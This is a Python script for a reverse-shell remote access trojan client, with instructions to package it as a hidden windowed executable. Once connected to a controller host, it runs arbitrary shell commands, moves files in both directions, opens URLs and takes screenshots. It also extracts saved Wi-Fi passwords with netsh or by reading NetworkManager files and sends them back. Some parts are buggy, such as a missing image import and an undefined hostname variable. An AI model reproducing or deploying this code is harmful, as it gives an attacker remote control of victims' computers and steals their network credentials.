#!/usr/bin/python
# -*- coding: utf-8 -*-

## FOR BUILD CLI AN EXE (pyinstaller --onefile --windowed)

import struct,socket,subprocess,os,platform,webbrowser as browser

from mss import mss
#from PIL import Image
import io

IP = "127.0.0.1" ## DNS ET IP
port = 5555

### DEF SCREEN 3
def get_next_screenshot_number():
    screenshot_folder = 'screenshot'
    if not os.path.exists(screenshot_folder):
        os.makedirs(screenshot_folder)
    files = [f for f in os.listdir(screenshot_folder) if f.endswith('.png')]
    num = len(files) + 1
    return num

def screenshot():
    with mss() as screen:
        monitor = screen.monitors[0]
        screenshot = screen.grab(monitor)
        num = get_next_screenshot_number()
        screenshot_path = os.path.join('screenshot', f'screenshot_{num}.png')
        with open(screenshot_path, 'wb') as file:
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            img.save(file, "PNG")


def get_machine_name():
  computer_name = socket.gethostname()
  controler.send(computer_name.encode())
  print("OS NAME SEND :", computer_name)


class senrev:
    def __init__(self,sock):
        self.sock = sock
    def send(self, data):
        pkt = struct.pack('>I', len(data)) + data
        self.sock.sendall(pkt)
    def recv(self):
        pktlen = self.recvall(4)
        if not pktlen: return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)
    def recvall(self, n):
        packet = b''
        while len(packet) < n:
            frame = self.sock.recv(n - len(packet))
            if not frame:return None
            packet += frame
        return packet


def cnet():
  try:
    ip = socket.gethostbyname("www.google.com")
    con = socket.create_connection((ip,80), 2)
    return True
  except socket.error: pass
  return False
def runCMD(cmd):
       runcmd = subprocess.Popen(cmd,
                                 shell=True,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
       return runcmd.stdout.read() + runcmd.stderr.read()

def upload(cmd):
   filetosend = "".join(cmd.split("download")).strip()
   if not os.path.isfile(filetosend): controler.send("[!] No such file on client machine :(\n".format(filetosend).encode("UTF-8"))
   else:
       controler.send(b"true")
       with open(filetosend, "rb") as wf:
        for data in iter(lambda: wf.read(4100), b""):
         try:controler.send(data)
         except(KeyboardInterrupt,EOFError):
          wf.close()
          controler.send(b":Aborted:")
          return
       controler.send(b":DONE:")


def wifishow():
  try:
    if platform.system() == "Windows": info = runCMD("netsh wlan show profile name=* key=clear")
    elif platform.system() == "Linux": info = runCMD("egrep -h -s -A 9 --color -T 'ssid=' /etc/NetworkManager/system-connections/*")
    else: info = b"osnot:"
  except Exception: info = b"osnot:"
  finally: controler.send(info)
def download(cmd):
     filetodown = "".join(cmd.split("upload")).strip()
     filetodown = filetodown.split("/")[-1] if "/" in filetodown else filetodown.split("\\")[-1] if "\\" in filetodown else filetodown
     wf = open(filetodown, "wb")
     while True:
      data = controler.recv()
      if data == b":DONE:":break
      elif cmd == "screenshot":
          try:
              screenshot()
              controler.send(b"Screenshot taken and saved as .screen.png")
          except Exception as e:
              controler.send("Error taking screenshot: {}".format(str(e)).encode("UTF-8"))
      elif data == b":Aborted:":
        wf.close()
        os.remove(filetodown)
        return
      wf.write(data)
     wf.close()
     controler.send(str(os.getcwd()+os.sep+filetodown).encode("UTF-8"))
def browse(cmd):
    url = "".join(cmd.split("open")).strip()
    browser.open(url)
def shell(senrev=senrev):
   global s
   global controler
   mainDIR = os.getcwd()
   tmpdir=""
   controler = senrev(s)
   while True:
     cmd = controler.recv()
     if cmd.strip():
       cmd = cmd.decode("UTF-8",'ignore').strip()
       if "download" in cmd:upload(cmd)
       elif "upload" in cmd:download(cmd)
       elif cmd == "kill":
          s.shutdown(2)
          s.close()
          break
       elif "open" in cmd: browse(cmd)
       elif cmd == ":get_hostname_machine":
          controler.send(computer_name.encode())
       elif cmd == ":check_internet_connection":
          if cnet() == True: controler.send(b"UP")
          else: controler.send(b"Down")
       elif cmd == "wifi": wifishow()
       elif "cd" in cmd:
               dirc = "".join(cmd.split("cd")).strip()
               if not dirc.strip() : controler.send("{}\n".format(os.getcwd()).encode("UTF-8"))
               elif dirc == "-": 
                 if not tmpdir: controler.send(b"error: cd: old [PAWD] not set yet !\n")
                 else:
                   tmpdir2 = os.getcwd()
                   os.chdir(tmpdir)
                   controler.send("back to [ {}/ ]\n".format(tmpdir).encode("UTF-8"))
                   tmpdir = tmpdir2
               elif dirc =="--":
                  tmpdir = os.getcwd()
                  os.chdir(mainDIR)
                  controler.send("back to first directory [ {}/ ]\n".format(mainDIR).encode("UTF-8"))
               else:
                 if not os.path.isdir(dirc): controler.send("error: cd: '{}': No such file or directory on client machine !\n".format(dirc).encode("UTF-8"))
                 else:
                     tmpdir = os.getcwd()
                     os.chdir(dirc)
                     controler.send("moved to [ {}/ ]\n".format(dirc).encode("UTF-8"))
       elif cmd == "pwd": controler.send(str(os.getcwd()+"\n").encode("UTF-8"))
       else:
               cmd_output = runCMD(cmd)
               controler.send(bytes(cmd_output))
   exit(1)
try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((IP, port))
  shell()
except Exception: exit(1)
